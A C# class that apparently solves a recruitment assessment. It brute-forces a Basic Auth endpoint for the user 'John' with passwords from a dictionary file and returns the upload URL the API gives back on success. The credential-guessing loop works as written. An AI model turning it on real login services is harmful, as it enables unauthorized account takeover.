using System;
using System.Net.Http.Headers;

namespace PasswordAPIAssessment
{
    public class PasswordCracker
    {
        // Endpoint to authenticate the username and password
        private readonly string _url = "http://recruitment.warpdevelopment.co.za/api/authenticate/";

        // Username to test against
        private readonly string _username = "John";

        // Method to crack the password using a dictionary file
        public string? CrackPassword(string dictFilePath)
        {
            // Read all lines (passwords) from the dictionary file
            string[] passwords = File.ReadAllLines(dictFilePath);

            // Create a new HttpClient instance
            using HttpClient client = new();

            // Loop through each password in the dictionary
            foreach (string password in passwords)
            {
                // Trim any whitespace or newline characters
                string trimmedPassword = password.Trim();

                // Encode username and password in Base64 for Basic Auth
                string credentials = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes($"{_username}:{trimmedPassword}"));
                client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Basic", credentials);

                try
                {
                    // Make GET request with Basic Auth headers
                    HttpResponseMessage message = client.GetAsync(_url).Result;

                    // If the response is successful, password is correct
                    if (message.IsSuccessStatusCode)
                    {
                        string responseBody = message.Content.ReadAsStringAsync().Result;
                        Console.WriteLine($"Error Body: {responseBody}");

                        Console.WriteLine($"✅ Success! Password found: {trimmedPassword}");
                        Console.WriteLine($"Upload URL: {responseBody}");

                        // Remove surrounding quotes from the URL if present
                        string cleanUrl = responseBody.Trim('"');
                        Console.WriteLine($"Upload URL (cleaned): {cleanUrl}");

                        // Return the valid upload URL
                        return cleanUrl;
                    }
                    else
                    {
                        // Output failed password attempt
                        Console.WriteLine($"❌ Failed: {trimmedPassword}");
                    }
                }
                catch (Exception ex)
                {
                    // Log any exceptions during the request
                    Console.WriteLine($"Error with password '{trimmedPassword}': {ex.Message}");
                }
            }

            // No valid password was found in the dictionary
            Console.WriteLine("No valid password found in dictionary.");
            return null;
        }
    }
}
